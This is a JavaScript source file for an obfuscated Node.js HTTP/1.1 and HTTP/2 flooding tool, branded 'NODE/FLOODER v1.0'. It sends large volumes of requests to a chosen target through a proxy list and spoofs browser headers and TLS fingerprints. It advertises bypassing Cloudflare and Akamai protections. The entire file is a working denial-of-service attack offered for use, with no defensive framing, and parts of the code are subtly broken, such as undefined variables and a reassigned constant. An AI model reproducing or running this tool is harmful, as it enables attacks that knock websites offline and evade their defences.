const net = require("net"),
  tls = require("tls"),
  HPACK = require("hpack"),
  cluster = require("cluster"),
  fs = require("fs"),
  os = require("os"),
  crypto = require("crypto"),
  {
    exec
  } = require("child_process"),
  chalk = require("chalk");
ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "TimeoutError", "JSONError", "URLError", "InvalidURL", "ProxyError"];
ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "EAI_AGAIN", "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND", "EAI_NODATA", "EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF", "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM", "EILSEQ", "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK", "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", "ENOENT", "ENOMEM", "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK", "EOPNOTSUPP", "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE", "EROFS", "ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID"];
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0).on("uncaughtException", function (_0x27d836) {
  console.log(_0x27d836);
  if (_0x27d836.code && ignoreCodes.includes(_0x27d836.code) || _0x27d836.name && ignoreNames.includes(_0x27d836.name)) return false;
}).on("unhandledRejection", function (_0x282b9b) {
  if (_0x282b9b.code && ignoreCodes.includes(_0x282b9b.code) || _0x282b9b.name && ignoreNames.includes(_0x282b9b.name)) return false;
}).on("warning", _0xa45b36 => {
  if (_0xa45b36.code && ignoreCodes.includes(_0xa45b36.code) || _0xa45b36.name && ignoreNames.includes(_0xa45b36.name)) return false;
}).on("SIGHUP", () => {
  return 1;
}).on("SIGCHILD", () => {
  return 1;
});
const statusesQ = [];
let statuses = {},
  isFull = process.argv.includes("--bypass");
const timestamp = Date.now(),
  reqmethod = process.argv[2],
  target = process.argv[3],
  time = process.argv[4],
  threads = process.argv[5],
  ratelimit = process.argv[6],
  proxyfile = process.argv[7],
  delayIndex = process.argv.indexOf("--delay"),
  queryIndex = process.argv.indexOf("--query"),
  query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined,
  c = process.argv.indexOf("--cookie"),
  cookies = queryIndex !== -1 && c + 1 < process.argv.length ? process.argv[c + 1] : undefined,
  randrateIndex = process.argv.indexOf("--randrate"),
  refererIndex = process.argv.indexOf("--referer"),
  forceHttpIndex = process.argv.indexOf("--http"),
  forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2",
  debugMode = process.argv.includes("--debug") && forceHttp != 1;
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
  console.clear();
  console.log(chalk.white.bold("Telegram:           ") + chalk.blue.bold("    t.me/ThaiDuongScript"));
  console.log(chalk.white.bold("Product:             ") + chalk.magenta.bold("   NODE/FLOODER v1.0"));
  console.log(chalk.white.bold("Date:                   ") + chalk.bgWhite.black.bold(new Date().toLocaleString("vn")));
  console.log(chalk.underline.white.bold("\nUsage") + chalk.reset(":"));
  console.log(chalk.white("     node " + process.argv[1] + " <GET/POST> <target> <time> <threads> <ratelimit> <proxy>"));
  console.log(chalk.underline.white.bold("\nExample") + chalk.reset(":"));
  console.log(chalk.italic.white("     node " + process.argv[1] + " GET \"https://iristeam.sbs/\" 120 10 10 proxy.txt --delay 1 --bypass --http 2 --debug --cookie"));
  console.log(chalk.underline.white.bold("\nOptions") + chalk.reset(":"));
  console.log(chalk.white("    --delay      ") + chalk.hex("#FFA500")("1-inf") + chalk.italic.white("   ~   Delay between requests."));
  console.log(chalk.white("    --http     ") + chalk.hex("#FFA500")("1/2/mix") + chalk.italic.white("   ~   Http version."));
  console.log(chalk.white("    --bypass     ") + chalk.italic.white("        ~   Bypass cloudflare,akamai,amazon,..."));
  console.log(chalk.white("    --debug      ") + chalk.italic.white("        ~   Show status code."));
  console.log(chalk.white("    --cookie     ") + chalk.italic.white("        ~   Enable cookie && response cookie."));
  process.exit(1);
}
const getRandomChar = () => {
  const _0x333115 = "abcdefghijklmnopqrstuvwxyz",
    _0x23a41d = Math.floor(Math.random() * _0x333115.length);
  return _0x333115[_0x23a41d];
};
var randomPathSuffix = "";
setInterval(() => {
  randomPathSuffix = "" + getRandomChar();
}, 3333);
const url = new URL(target),
  proxy = fs.readFileSync(proxyfile, "utf8").replace(/\r/g, "").split("\n");
function encodeFrame(_0x821f05, _0xf5d453, _0x271634 = "", _0x4867a2 = 0) {
  let _0x536b3d = Buffer.alloc(9);
  _0x536b3d.writeUInt32BE(_0x271634.length << 8 | _0xf5d453, 0);
  _0x536b3d.writeUInt8(_0x4867a2, 4);
  _0x536b3d.writeUInt32BE(_0x821f05, 5);
  if (_0x271634.length > 0) _0x536b3d = Buffer.concat([_0x536b3d, _0x271634]);
  return _0x536b3d;
}
function decodeFrame(_0x46bae2) {
  if (_0x46bae2.length < 9) return null;
  const _0x455372 = _0x46bae2.readUInt32BE(0),
    _0x5ea299 = _0x455372 >> 8,
    _0x4b4ecb = _0x455372 & 255,
    _0x4dafaa = _0x46bae2.readUint8(4),
    _0x4de5d2 = _0x46bae2.readUInt32BE(5),
    _0x4bd656 = _0x4dafaa & 32 ? 5 : 0;
  let _0x3ccd6e = Buffer.alloc(0);
  if (_0x5ea299 > 0) {
    _0x3ccd6e = _0x46bae2.subarray(9 + _0x4bd656, 9 + _0x4bd656 + _0x5ea299);
    if (_0x3ccd6e.length + _0x4bd656 != _0x5ea299) {
      return null;
    }
  }
  return {
    "streamId": _0x4de5d2,
    "length": _0x5ea299,
    "type": _0x4b4ecb,
    "flags": _0x4dafaa,
    "payload": _0x3ccd6e
  };
}
function encodeSettings(_0x25d624) {
  const _0x1f99ba = Buffer.alloc(6 * _0x25d624.length);
  for (let _0xd75b34 = 0; _0xd75b34 < _0x25d624.length; _0xd75b34++) {
    _0x1f99ba.writeUInt16BE(_0x25d624[_0xd75b34][0], _0xd75b34 * 6);
    _0x1f99ba.writeUInt32BE(_0x25d624[_0xd75b34][1], _0xd75b34 * 6 + 2);
  }
  return _0x1f99ba;
}
function randstr(_0x4372f8) {
  const _0x2e8b7d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let _0x453ed3 = "";
  const _0x168dfe = _0x2e8b7d.length;
  for (let _0x28acea = 0; _0x28acea < _0x4372f8; _0x28acea++) {
    _0x453ed3 += _0x2e8b7d.charAt(Math.floor(Math.random() * _0x168dfe));
  }
  return _0x453ed3;
}
if (url.pathname.includes("%RAND%")) {
  const randomValue = randstr(6) + "&" + randstr(6);
  url.pathname = url.pathname.replace("%RAND%", randomValue);
}
function randstrr(_0x1d27e9) {
  const _0x273227 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
  let _0x14bcc3 = "";
  const _0x3aa83a = _0x273227.length;
  for (let _0x40dd53 = 0; _0x40dd53 < _0x1d27e9; _0x40dd53++) {
    _0x14bcc3 += _0x273227.charAt(Math.floor(Math.random() * _0x3aa83a));
  }
  return _0x14bcc3;
}
function generateRandomString(_0x21b396, _0x314492) {
  const _0x52d4a9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    _0x318b1b = Math.floor(Math.random() * (_0x314492 - _0x21b396 + 1)) + _0x21b396;
  let _0x5b872f = "";
  for (let _0x34812c = 0; _0x34812c < _0x318b1b; _0x34812c++) {
    const _0x1fcc7f = Math.floor(Math.random() * _0x52d4a9.length);
    _0x5b872f += _0x52d4a9[_0x1fcc7f];
  }
  return _0x5b872f;
}
function cc(_0x3600bf, _0x1b9eb7) {
  const _0x23c2b2 = "abcdefghijklmnopqrstuvwxyz",
    _0x3d593a = Math.floor(Math.random() * (_0x1b9eb7 - _0x3600bf + 1)) + _0x3600bf;
  let _0x6f5564 = "";
  for (let _0x3572e2 = 0; _0x3572e2 < _0x3d593a; _0x3572e2++) {
    const _0x29be74 = Math.floor(Math.random() * _0x23c2b2.length);
    _0x6f5564 += _0x23c2b2[_0x29be74];
  }
  return _0x6f5564;
}
function randstrb(_0x2d87b0) {
  const _0x4d0d63 = "0123456789";
  let _0x567009 = "";
  const _0x13693a = _0x4d0d63.length;
  for (let _0x5c9301 = 0; _0x5c9301 < _0x2d87b0; _0x5c9301++) {
    _0x567009 += _0x4d0d63.charAt(Math.floor(Math.random() * _0x13693a));
  }
  return _0x567009;
}
function generate_headers() {
  const _0x4430e5 = Math.floor(Math.random() * 6) + 123,
    _0x4abd46 = Math.random(),
    _0x54ebb9 = _0x4abd46 < 0.33 ? "Windows" : _0x4abd46 < 0.66 ? "Linux" : "macOS",
    _0x4dd635 = Math.floor(Math.random() * 1e+49) + 1e+46,
    _0x1cec75 = {
      "version": _0x4430e5,
      "headers": {
        "sec-ch-ua": "\"Google Chrome\";v=\"" + _0x4430e5 + "\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"" + _0x4430e5 + "\"",
        "sec-ch-mobile": "?0",
        "sec-ch-ua-platform": "\"" + _0x54ebb9 + "\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "" + (_0x54ebb9 === "Windows" ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x4430e5 + ".0.0.0 Safari/537.36 " + _0x4dd635 : _0x54ebb9 === "Linux" ? "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x4430e5 + ".0.0.0 Safari/537.36 " + _0x4dd635 : "Mozilla/5.0 (Macintosh; Intel Mac OS X 1" + randstrb(1) + "_" + randstrb(1) + "_" + randstrb(1) + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x4430e5 + ".0.0.0 Safari/537.36 " + _0x4dd635),
        "accept": "" + (Math.random() > 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "*/*"),
        "sec-fetch-site": "?1",
        "sec-fetch-mode": "none",
        "sec-fetch-user": "document",
        "sec-fetch-dest": "navigate",
        "accept-encoding": "gzip, br",
        "accept-language": "en-US,en;q=1.0",
        "cookie": null
      },
      "sigalgs": "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      "ciphers": "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA",
      "settings": {
        "initial_stream_window_size": 6291456,
        "initial_connection_window_size": 15728640,
        "max_concurrent_streams": 1000,
        "max_header_list_size": 262144,
        "header_table_size": 65536,
        "enable_push": false
      }
    };
  return _0x1cec75;
}
function getRandomInt(_0x4ff25e, _0x4c9202) {
  return Math.floor(Math.random() * (_0x4c9202 - _0x4ff25e + 1)) + _0x4ff25e;
}
function parse_headers(_0x2854ab) {
  const _0x511a91 = /\(([^)]+)\)/,
    _0x2b5bcb = /Chrome\/(\d+)/,
    _0x49a3df = _0x2854ab.match(_0x511a91),
    _0x1ef920 = _0x2854ab.match(_0x2b5bcb);
  let _0x17ae67 = "Windows";
  if (_0x49a3df) {
    const _0x2e6e82 = _0x49a3df[1];
    if (_0x2e6e82.includes("Macintosh")) _0x17ae67 = "macOS";else {
      if (_0x2e6e82.includes("Linux")) _0x17ae67 = "Linux";else {
        if (_0x2e6e82.includes("Windows")) {
          _0x17ae67 = "Windows";
        }
      }
    }
  }
  const _0x40153c = _0x1ef920 ? parseInt(_0x1ef920[1], 10) : 130;
  return {
    "os": _0x17ae67,
    "version": _0x40153c
  };
}
function http1_headers(_0x29bf31) {
  function _0x19b4ce(_0x98d90d) {
    const _0x52ecc1 = "0123456789";
    let _0x1a3503 = "";
    const _0x536298 = _0x52ecc1.length;
    for (let _0x22b0f3 = 0; _0x22b0f3 < _0x98d90d; _0x22b0f3++) {
      _0x1a3503 += _0x52ecc1.charAt(Math.floor(Math.random() * _0x536298));
    }
    return _0x1a3503;
  }
  const _0x56cc31 = ["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9", "zh-CN,zh;q=0.9", "ru-RU,ru;q=0.9", "hi-IN,hi;q=0.9", "tr-TR,tr;q=0.9", "pt-BR,pt;q=0.9", "it-IT,it;q=0.9", "nl-NL,nl;q=0.9", "ko-KR,ko;q=0.9"],
    _0x392c2e = Math.floor(Math.random() * 21) + 110,
    _0x25c758 = Math.floor(Math.random() * 1e+49) + 1e+46,
    _0x77f51f = Math.random(),
    _0xb0ec72 = _0x77f51f < 0.33 ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x392c2e + ".0.0.0 Safari/537.36" : _0x77f51f < 0.66 ? "Mozilla/5.0 (Macintosh; Intel Mac OS X 1" + _0x19b4ce(1) + "_" + _0x19b4ce(1) + "_" + _0x19b4ce(1) + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x392c2e + ".0.0.0 Safari/537.36" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _0x392c2e + ".0.0.0 Safari/537.36",
    _0x377949 = "\r\n";
  let _0x2d3363 = "User-Agent: " + _0xb0ec72 + _0x25c758 + _0xb0ec72 + _0x377949,
    _0x3cc554 = "GET " + _0x29bf31.pathname;
  _0x3cc554 += "Host: " + _0x29bf31.hostname + (_0x29bf31.port ? ":" + _0x29bf31.port : "") + _0x377949;
  if (cookies) _0x2d3363 += "Cookie: " + cookies + _0x377949;
  _0x2d3363 += "Upgrade-Insecure-Requests: 1" + _0x377949;
  _0x2d3363 += "Accept-Language: " + _0x56cc31[~~Math.floor(Math.random * _0x56cc31.length)] + _0x377949;
  _0x2d3363 += "Sec-Fetch-Site: " + (Math.random() > 0.5 ? "same-origin" : "none") + " " + _0x377949;
  _0x2d3363 += "Sec-Fetch-Mode: navigate" + _0x377949;
  _0x2d3363 += "Sec-Fetch-User: ?1" + _0x377949;
  _0x2d3363 += "Sec-Fetch-Dest: document" + _0x377949;
  _0x2d3363 += "Accept-Encoding: gzip, deflate" + _0x377949;
  _0x2d3363 += "Accept: " + (Math.random() > 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "*/*") + _0x377949;
  _0x2d3363 += "Cache-Control: " + (Math.random() > 0.5 ? "max-age=0" : "no-cache") + _0x377949;
  _0x2d3363 += "Connection: keep-alive" + _0x377949;
  let _0x3f5706 = parse_headers(_0xb0ec72);
  _0x2d3363 += "sec-ch-ua: \"Google Chrome\";v=\"" + _0x3f5706.version + "\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"" + _0x3f5706.version + "\"" + _0x377949;
  _0x2d3363 += "sec-ch-mobile: ?0" + _0x377949;
  _0x2d3363 += "sec-ch-ua-platform: \"" + _0x3f5706.os + "\"" + _0x377949;
  if (Math.random() > 0.5) _0x2d3363 += "Origin: https://" + _0x29bf31.hostname + _0x377949;
  if (Math.random() > 0.5) _0x2d3363 += "Referer: https://" + _0x29bf31.hostname + "/" + _0x377949;
  function _0x1a45e6(_0x4b5051) {
    for (let _0x1a39a8 = _0x4b5051.length - 1; _0x1a39a8 > 0; _0x1a39a8--) {
      const _0x40b8bb = Math.floor(Math.random() * (_0x1a39a8 + 1));
      [_0x4b5051[_0x1a39a8], _0x4b5051[_0x40b8bb]] = [_0x4b5051[_0x40b8bb], _0x4b5051[_0x1a39a8]];
    }
    return _0x4b5051;
  }
  return _0x3cc554 + _0x1a45e6(_0x2d3363.split(_0x377949).filter(_0x5e8cb2 => _0x5e8cb2 !== null && _0x5e8cb2 !== undefined && _0x5e8cb2 !== "")).join(_0x377949) + _0x377949 + _0x377949;
}
function go() {
  const [_0x5f2342, _0x3ddadf] = proxy[~~(Math.random() * proxy.length)].split(":");
  let _0x4d22d3;
  if (!_0x3ddadf || isNaN(_0x3ddadf)) {
    go();
    return;
  }
  const _0x5e232a = net.connect(Number(_0x3ddadf), _0x5f2342, () => {
    _0x5e232a.once("data", () => {
      let _0x24b0a7 = generate_headers(),
        _0x19ae81 = http1_headers(url);
      if (cookies) {
        if (_0x19ae81 && typeof _0x19ae81 !== "boolean") try {
          _0x24b0a7.headers = JSON.parse(_0x19ae81);
        } catch (_0x44e572) {
          console.log("headers error:", _0x44e572);
        } else {
          const _0x1ea1fa = parse_headers(user_agent);
          _0x24b0a7.headers = versions.chrome[_0x1ea1fa.version].headers;
        }
        const _0x47b2be = parse_headers(user_agent);
        _0x24b0a7.headers["user-agent"] = rt + user_agent;
        _0x24b0a7.headers["sec-ch-ua"] = "\"Google Chrome\";v=\"" + _0x47b2be.version + "\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"" + _0x47b2be.version + "\"";
        _0x24b0a7.headers["sec-ch-platform"] = "\"" + _0x47b2be.os + "\"";
        _0x24b0a7.headers.cookie = cookies;
      }
      _0x4d22d3 = tls.connect({
        "socket": _0x5e232a,
        "ALPNProtocols": forceHttp == 2 ? ["h2", "http/1.1"] : forceHttp == 1 ? ["http/1.1"] : ["h2", "http/1.1"],
        "host": url.hostname,
        "servername": url.host,
        "ciphers": "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA",
        "minVersion": Math.random() < 0.5 ? "TLSv1.3" : "TLSv1.2",
        "maxVersion": "TLSv1.3",
        "secureOptions": crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
        "rejectUnauthorized": false
      }, () => {
        _0x4d22d3.allowHalfOpen = true;
        _0x4d22d3.setNoDelay(true);
        _0x4d22d3.setKeepAlive(true, 60000);
        _0x4d22d3.setMaxListeners(0);
      }, () => {
        if (!_0x4d22d3.alpnProtocol || _0x4d22d3.alpnProtocol == "http/1.1") {
          if (forceHttp == 2) {
            _0x4d22d3.end(() => _0x4d22d3.destroy());
            return;
          }
          function _0x4ae107() {
            _0x4d22d3.write(_0x19ae81, _0x3dcf2e => {
              !_0x3dcf2e ? setTimeout(() => {
                _0x4ae107();
              }, isFull ? 1000 : 1000 / ratelimit) : _0x4d22d3.end(() => _0x4d22d3.destroy());
            });
          }
          _0x4ae107();
          _0x4d22d3.on("error", () => {
            _0x4d22d3.close(() => _0x4d22d3.destroy());
          });
          return;
        }
        if (forceHttp == 1) {
          _0x4d22d3.end(() => _0x4d22d3.destroy());
          return;
        }
        let _0x4465db = 1,
          _0x853c5 = Buffer.alloc(0),
          _0x5f1989 = new HPACK();
        _0x5f1989.setTableSize(4096);
        const _0x8ac5e7 = Buffer.alloc(4);
        _0x8ac5e7.writeUInt32BE(15663105, 0);
        const _0x3177bc = [Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "binary"), encodeFrame(0, 4, encodeSettings([[1, Math.random() < 0.5 ? 65536 : 65535], [2, 0], [3, Math.random() < 0.5 ? 100 : 1000], [4, Math.random() < 0.5 ? 6291456 : 33554432], [5, 16384], [6, 262144]])), encodeFrame(0, 8, _0x8ac5e7)];
        _0x4d22d3.on("data", _0x4a5e61 => {
          _0x853c5 = Buffer.concat([_0x853c5, _0x4a5e61]);
          while (_0x853c5.length >= 9) {
            const _0x16cad5 = decodeFrame(_0x853c5);
            if (_0x16cad5) {
              _0x853c5 = _0x853c5.subarray(_0x16cad5.length + 9);
              _0x16cad5.type == 4 && _0x16cad5.flags == 0 && _0x4d22d3.write(encodeFrame(0, 4, "", 1));
              if (_0x16cad5.type == 0) {
                let _0x4db4fb = _0x16cad5.length;
                if (_0x4db4fb < 6000) {
                  let _0x2a3b6f = 65536 - _0x4db4fb;
                  _0x4db4fb += _0x2a3b6f;
                  const _0x305823 = Buffer.alloc(4);
                  _0x305823.writeUInt32BE(_0x2a3b6f, 0);
                  _0x4d22d3.write(encodeFrame(0, 8, _0x305823));
                }
              }
              if (_0x16cad5.type == 1) try {
                const _0x43f7e1 = parseInt(_0x5f1989.decode(_0x16cad5.payload).find(_0x1c8ec3 => _0x1c8ec3[0] == ":status")[1]);
                if (!isNaN(_0x43f7e1) && _0x43f7e1 >= 100 && _0x43f7e1 <= 599) {
                  if (!statuses[_0x43f7e1]) statuses[_0x43f7e1] = 0;
                  statuses[_0x43f7e1]++;
                  if (_0x43f7e1 === 302 || _0x43f7e1 === 301) {
                    const _0x5ad260 = _0x5f1989.decode(_0x16cad5.payload).find(_0x320e7a => _0x320e7a[0] == "location")[1];
                    url = new URL(_0x5ad260, url.href);
                  }
                  if (_0x43f7e1 === 429) {}
                  try {
                    const _0xc6a806 = _0x5f1989.decode(_0x16cad5.payload).find(_0x3ed009 => _0x3ed009[0] == "set-cookie")[1];
                    if (_0xc6a806) {
                      if (_0x24b0a7.headers.cookie === null && !cookies) _0x24b0a7.headers.cookie = _0xc6a806;else {
                        if (_0x24b0a7.headers.cookie === null && cookies) _0x24b0a7.headers.cookie = cookies + "; " + _0xc6a806;
                      }
                    }
                  } catch (_0xe984fd) {}
                }
              } catch (_0x592af5) {}
              if (_0x16cad5.type == 6) {
                !(_0x16cad5.flags & 1) && _0x4d22d3.write(encodeFrame(0, 6, _0x16cad5.payload, 1));
              }
              if (_0x16cad5.type == 7 || _0x16cad5.type == 5) {
                if (_0x16cad5.type == 7) {
                  if (!statuses.GOAWAY) statuses.GOAWAY = 0;
                  statuses.GOAWAY++;
                }
                _0x4d22d3.end(() => _0x4d22d3.destroy());
                return;
              }
            } else break;
          }
        });
        _0x4d22d3.on("error", _0x3bcc9e => {
          return;
        });
        _0x4d22d3.on("close", () => {
          return;
        });
        _0x4d22d3.write(Buffer.concat(_0x3177bc));
        function _0x56f588() {
          let _0x490624 = 0;
          if (_0x4d22d3.destroyed) {
            return;
          }
          for (let _0x2eca5d = 0; _0x2eca5d < ratelimit; _0x2eca5d++) {
            const _0x5e4aa8 = Object.entries({
                ":method": "GET",
                ":authority": url.hostname,
                ":scheme": "https",
                ":path": query ? handleQuery(query) : url.pathname
              }).filter(_0x24be79 => _0x24be79[1] != null),
              _0x1a1e71 = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join(""),
              _0x55fa7a = {
                "site": ["same-origin", "none"],
                "mode": ["cors", "no-cors", "navigate"],
                "dest": ["document", "script", "image"]
              };
            _0x490624 > 1 && (_0x24b0a7.headers["sec-fetch-site"] = _0x55fa7a.site[~~Math.floor(Math.random * _0x55fa7a.site.length)], _0x24b0a7.headers["sec-fetch-mode"] = _0x55fa7a.mode[~~Math.floor(Math.random() * _0x55fa7a.mode.length)], _0x24b0a7.headers["sec-fetch-dest"] = _0x55fa7a.dest[~~Math.floor(Math.random() * _0x55fa7a.dest.length)]);
            const _0x4956a4 = Object.entries({
                "user-agent": _0x24b0a7.headers["user-agent"],
                "accept": _0x24b0a7.headers.accept,
                "sec-fetch-site": _0x24b0a7.headers["sec-fetch-site"],
                "sec-fetch-mode": _0x24b0a7.headers["sec-fetch-mode"],
                "sec-fetch-user": _0x24b0a7.headers["sec-fetch-user"],
                "sec-fetch-dest": _0x24b0a7.headers["sec-fetch-dest"],
                "accept-encoding": _0x24b0a7.headers["accept-encoding"],
                "accept-language": _0x24b0a7.headers["accept-language"],
                "cookie": _0x24b0a7.headers.cookie,
                "cache-control": Math.random() > 0.5 ? "max-age=0" : "no-cache",
                "priority": "u=" + Math.round(Math.random() * 5) + ", i",
                "x-forwarded-for": proxy[0]
              }).filter(_0x45175e => _0x45175e[1] != null),
              _0x5a8065 = Object.entries({
                "sec-ch-ua": _0x24b0a7.headers["sec-ch-ua"],
                "sec-ch-mobile": _0x24b0a7.headers["sec-ch-mobile"],
                "sec-ch-ua-platform": _0x24b0a7.headers["sec-ch-ua-platform"],
                ...(Math.random() < 0.5 && {
                  ["referer"]: "https://" + url.hostname + "/" + _0x1a1e71
                }),
                ...(Math.random() < 0.5 && {
                  ["origin"]: "https://www.google.com/?p=" + _0x1a1e71
                })
              }).filter(_0x2cf9d8 => _0x2cf9d8[1] != null),
              _0x339498 = _0x5e4aa8.concat(_0x4956a4).concat(_0x5a8065),
              _0x2d807c = Buffer.concat([Buffer.from([128, 0, 0, 0, 255]), _0x5f1989.encode(_0x339498)]);
            _0x4d22d3.write(Buffer.concat([encodeFrame(_0x4465db, 1, _0x2d807c, 1 | 4 | 32)]));
            _0x490624 += 1;
            if (_0x4465db > 200) return;
            _0x4465db += 2;
          }
          setTimeout(() => {
            _0x56f588();
          }, isFull ? 1000 : 1000 / ratelimit);
        }
        _0x56f588();
      }).on("error", _0x15bc8f => {
        _0x4d22d3.destroy();
      });
    });
    _0x5e232a.write("CONNECT " + url.host + ":443 HTTP/1.1\r\nHost: " + url.host + ":443\r\nProxy-Connection: Keep-Alive\r\n\r\n");
  }).once("error", _0x26f123 => {}).once("close", () => {});
}
if (cluster.isMaster) {
  const workers = {};
  Array.from({
    "length": threads
  }, (_0x5b3fc7, _0x197fbc) => cluster.fork({
    "core": _0x197fbc % os.cpus().length
  }));
  cluster.on("exit", _0x37afe4 => {
    cluster.fork({
      "core": _0x37afe4.id % os.cpus().length
    });
  });
  cluster.on("message", (_0x43f140, _0x555d5d) => {
    workers[_0x43f140.id] = [_0x43f140, _0x555d5d];
  });
  debugMode && setInterval(() => {
    let _0x1727d7 = {};
    for (let _0x4a0ac0 in workers) {
      if (workers[_0x4a0ac0][0].state == "online") {
        for (let _0x438c54 of workers[_0x4a0ac0][1]) {
          for (let _0x480a3b in _0x438c54) {
            if (_0x1727d7[_0x480a3b] == null) _0x1727d7[_0x480a3b] = 0;
            _0x1727d7[_0x480a3b] += _0x438c54[_0x480a3b];
          }
        }
      }
    }
    console.log(new Date().toLocaleString("vn"), _0x1727d7);
  }, 1000);
  setTimeout(() => process.exit(1), time * 1000);
} else setInterval(() => {
  go();
}), debugMode && setInterval(() => {
  if (statusesQ.length >= 4) statusesQ.shift();
  statusesQ.push(statuses);
  statuses = {};
  process.send(statusesQ);
}, 250), setTimeout(() => process.exit(1), time * 1000);